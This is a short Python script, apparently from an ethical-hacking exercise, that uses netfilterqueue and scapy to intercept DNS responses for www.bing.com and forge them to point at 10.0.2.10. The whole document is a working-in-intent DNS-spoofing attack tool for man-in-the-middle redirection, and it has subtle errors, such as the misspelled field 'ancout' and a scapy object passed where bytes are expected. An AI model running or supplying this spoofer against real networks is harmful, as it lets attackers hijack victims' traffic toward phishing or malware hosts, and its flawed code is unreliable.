import netfilterqueue
import scapy.all as scapy

# netfilterqueue: Chi dung cho python < 3.7

def process_packet(packet):
    sc_packet = scapy.IP(packet.get_payload())
    if sc_packet.haslayer(scapy.DNSRR):
        qname = sc_packet[scapy.DNSQR].qname
        if ("www.bing.com") in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.10")
            sc_packet[scapy.DNS].an = answer
            sc_packet[scapy.DNS].ancout = 1

            del sc_packet[scapy.IP].len
            del sc_packet[scapy.IP].chksum
            del sc_packet[scapy.UDP].len
            del sc_packet[scapy.UDP].chksum

            packet.set_payload(sc_packet)

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()